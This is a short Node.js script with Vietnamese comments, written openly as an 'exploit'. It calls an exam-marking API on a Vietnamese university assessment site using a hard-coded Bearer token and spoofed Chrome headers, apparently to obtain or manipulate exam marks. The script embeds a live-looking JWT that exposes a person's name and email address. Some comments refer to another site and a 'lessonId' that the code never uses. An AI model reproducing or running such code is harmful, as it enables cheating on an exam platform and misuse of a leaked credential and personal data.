import axios from "axios";
import https from "https";

// ============================================================================
// [CONFIG] KHU VỰC CẤU HÌNH (ĐIỀN THÔNG TIN THẬT VÀO ĐÂY)
// ============================================================================
const testID = "331506";
const TARGET_URL = `https://api.hsavnu.edu.vn/exams/mark-point-exam/${testID}`;

// [QUAN TRỌNG] Token lấy từ F12 -> Network -> Header "Authorization"
// Định dạng: "eyJhbGciOiJIUz..." (Không bao gồm từ Bearer ở đầu nếu bạn paste vào đây)

// ============================================================================
// [PAYLOAD] Dữ liệu gửi đi (Đã tối ưu để tránh crash server)
// ============================================================================

// ============================================================================
// [HEADERS] Giả lập Full Fingerprint của Chrome trên MacOS/Windows
// ============================================================================
const YOUR_TOKEN =
  "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY3NThlNTYzYzBiNjRhNzVmN2UzZGFlNDk0ZDM5NTk1YzE0MGVmOTMiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVMO0biBQaOG6oW0gUXVhbmcgSHV5IiwiaXNzIjoiaHR0cHM6Ly9zZWN1cmV0b2tlbi5nb29nbGUuY29tL2hzYS1lZHVjYXRpb24iLCJhdWQiOiJoc2EtZWR1Y2F0aW9uIiwiYXV0aF90aW1lIjoxNzcwMzYyODA4LCJ1c2VyX2lkIjoieFQ5S3Q5aUM2NE5lQ0JBNnJLNVJ0UVhOQ05xMiIsInN1YiI6InhUOUt0OWlDNjROZUNCQTZySzVSdFFYTkNOcTIiLCJpYXQiOjE3NzAzNjI4MDgsImV4cCI6MTc3MDM2NjQwOCwiZW1haWwiOiJ0b25waGFtcXVhbmdodXkzQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbInRvbnBoYW1xdWFuZ2h1eTNAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.bwpRxb-wubgQlkCggvSkUpBZ-vceTtdldbJbhfyFwojWioVJ3soaCg4R5DQV_2hhLAso0rVbwyzbaJatRvcalwF47vvCrOXxjMQ4Fe0XI4mO9-Slm-I_TPSdlBkmzTpUiUVVvFmr-dm0ou8fgRNtC35cWgvHGlEGR-6S1_P0ENSSn1LEcZkNn1Mh0tlbQQwsmJDAc_sl3U_K4taHWdhlEJT7q4eEALty5B_VIvXnnz2VN5Jy6poml17qnYj0WLVDdt81A2t3ixU6NXfLwNie7OBFr5ovUtNNnCc9ATpghRv0o-pKHALU3Y5DBT06EMc4HdUGqXY3jY0-hKPp6AB0lA"; // <--- DÁN TOKEN VÀO GIỮA 2 DẤU NGOẶC KÉP
const headers = {
  Authority: "api.hsavnu.edu.vn",
  Accept: "application/json",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",

  // Authorization là CHÌA KHÓA để fix lỗi 500.
  Authorization: `Bearer ${YOUR_TOKEN}`,

  "Content-Type": "application/json",

  // Origin chính xác dựa trên response header bạn cung cấp
  Origin: "https://hsavnu.edu.vn",

  // Referer trỏ về đúng trang bài học (Giả lập việc bạn đang xem bài 3982)
  Referer: `https://hsavnu.edu.vn/exams`,

  // User-Agent giả lập Chrome mới nhất
  "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

  // Các header bảo mật giả lập trình duyệt
  "Sec-Ch-Ua":
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": '"macOS"', // Đổi thành "Windows" nếu bạn dùng Win
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-site",

  // Connection Keep-Alive để duy trì kết nối như người dùng thật
  Connection: "keep-alive",
};

// ============================================================================
// [CORE] Hàm thực thi tấn công
// ============================================================================
async function exploit() {
  if (YOUR_TOKEN === "DÁN_TOKEN_CỦA_BẠN_VÀO_ĐÂY") {
    console.error(
      "[!] LỖI: Bạn chưa điền Token! Request sẽ thất bại (500/401).",
    );
    return;
  }

  try {
    const response = await axios.get(TARGET_URL, {
      headers: headers,
      // Bypass SSL nếu cần thiết (nhưng Rikkei dùng https chuẩn nên không cần thiết lắm)
      httpsAgent: new https.Agent({ rejectUnauthorized: true }),
      validateStatus: () => true, // Không throw lỗi để ta đọc được response body của lỗi 500
    });

    if (response.status === 201 || response.status === 200) {
      console.log("\n[+] EXPLOIT SUCCESSFUL (Thành công)!");
      console.log("[+] Status Code: 201 Created");
      console.log("[+] Response:", JSON.stringify(response.data, null, 2));
    } else {
      console.log(`\n[-] FAILED with Status: ${response.status}`);
      console.log("[-] Headers trả về:", response.headers);
      console.log("[-] Data trả về:", response.data);

      // Phân tích lỗi
      if (response.status === 500) {
        console.log("\n[!!!] PHÂN TÍCH LỖI 500:");
        console.log("1. Token của bạn có thể đã hết hạn hoặc sai format.");
        console.log(
          '2. Payload "lessonId" có thể không tồn tại trong Database.',
        );
        console.log(
          "3. Hãy thử bật F12 trên trình duyệt, làm thủ công 1 lần và copy y hệt Payload.",
        );
      }
    }
  } catch (error) {
    console.error("\n[!] LỖI MẠNG (NETWORK ERROR):", error.message);
  }
}

// Chạy
exploit();
